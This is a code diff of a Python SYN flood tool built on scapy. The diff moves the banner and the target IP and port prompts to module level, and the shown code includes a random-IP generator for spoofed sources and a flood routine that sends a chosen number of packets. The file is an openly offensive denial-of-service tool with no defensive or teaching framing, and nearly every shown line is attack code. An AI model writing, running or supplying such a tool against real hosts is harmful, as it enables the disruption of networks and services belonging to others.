@@ -2,6 +2,17 @@ from os import system
 from sys import stdout
 from scapy.all import *
 from random import randint
+import os
+
+os.system("clear")
+print ("#####################################")
+print ("#        github.com/EmreOvunc       #")
+print ("#####################################")
+print ("# Welcome to Python3 SYN Flood Tool #")
+print ("#####################################")
+
+dstIP = str(input("\nTarget IP : "))
+dstPort = int(input("Target Port : "))
 
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
@@ -39,22 +50,7 @@ def SYN_Flood(dstIP,dstPort,counter):
 	stdout.write("\nTotal packets sent: %i\n" % total)
 
 
-def info():
-	system("clear")
-	print ("#####################################")
-	print ("#        github.com/EmreOvunc       #")
-	print ("#####################################")
-	print ("# Welcome to Python3 SYN Flood Tool #")
-	print ("#####################################")
-
-	dstIP = str(input("\nTarget IP : "))
-	dstPort = int(input("Target Port : "))
-
-	return dstIP,int(dstPort)
-
-
 def main():
-	dstIP,dstPort = info()
 	counter = input ("How many packets do you want to send : ")
 	SYN_Flood(dstIP,dstPort,int(counter))
 
